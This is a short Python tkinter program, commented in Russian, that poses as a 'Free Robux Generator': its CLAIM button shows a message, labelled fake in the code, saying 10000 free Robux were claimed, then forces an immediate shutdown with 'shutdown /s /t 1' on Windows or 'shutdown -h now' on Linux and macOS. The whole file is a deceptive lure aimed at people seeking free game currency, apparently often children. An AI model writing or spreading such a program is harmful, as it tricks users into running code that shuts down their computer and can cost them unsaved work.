import tkinter as tk
from tkinter import messagebox
import os
import platform
import time

def shutdown_computer():
    # Показываем "поддельное" сообщение
    messagebox.showinfo("Bobux Claimed", "✅ Congratulations! You've claimed 10000 free robux!")
    
    # Задержка перед выключением (3 секунды)
    time.sleep(3)
    
    # Выключаем компьютер в зависимости от ОС
    system = platform.system()
    try:
        if system == "Windows":
            os.system("shutdown /s /t 1")
        elif system == "Linux" or system == "Darwin":
            os.system("shutdown -h now")
        else:
            messagebox.showerror("Error", "Unsupported operating system")
    except Exception as e:
        messagebox.showerror("Error", f"Failed to shutdown: {str(e)}")

# Создаем главное окно
root = tk.Tk()
root.title("Free Robux Generator")
root.geometry("300x300")
root.resizable(False, False)
root.configure(bg="#1e1e1e")

# Добавляем надпись
label = tk.Label(
    root, 
    text="Free Robux", 
    font=("Arial", 35, "bold"), 
    bg="#1e1e1e",
    fg="#ffffff"
)
label.pack(pady=40)

# Добавляем кнопку
claim_button = tk.Button(
    root, 
    text="CLAIM", 
    command=shutdown_computer,  # Теперь вызывает выключение
    bg="#4CAF50",
    fg="white", 
    font=("Arial", 23, "bold"),
    padx=50,
    pady=15,
    borderwidth=0,
    relief="flat",
    activebackground="#257529",
    activeforeground="white"
)
claim_button.pack()

# Запускаем главный цикл
root.mainloop()